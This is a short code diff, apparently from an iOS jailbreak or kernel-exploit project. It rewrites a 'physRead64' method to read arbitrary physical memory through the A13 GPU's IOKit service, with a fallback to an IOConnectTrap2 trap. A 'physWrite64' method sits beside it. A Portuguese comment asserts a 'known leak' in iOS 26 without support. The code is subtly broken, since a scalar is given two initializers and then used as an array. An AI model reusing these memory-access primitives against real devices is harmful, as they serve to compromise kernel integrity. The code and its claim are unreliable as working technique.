@@ -39,18 +39,24 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 
 - (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
-    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
-    func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
-
-    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
+    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG11G")); // GPU do A13
     io_connect_t conn;
     if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == 0) {
-        if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
+        // No iOS 26, a GPU pode ler endereços físicos via seletor de textura (vazamento conhecido)
+        uint64_t in = {pa, 8};
+        uint32_t outC = 1;
+        if (IOConnectCallMethod(conn, 1, in, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
+            // Se falhar, tenta o fallback da Trap 7 que já tínhamos
+            void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+            func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
+            if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
+            if (h) dlclose(h);
+        }
         IOServiceClose(conn);
     }
-    if (h) dlclose(h);
     return val;
 }
+
 
 - (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
     uint64_t tg = 0;
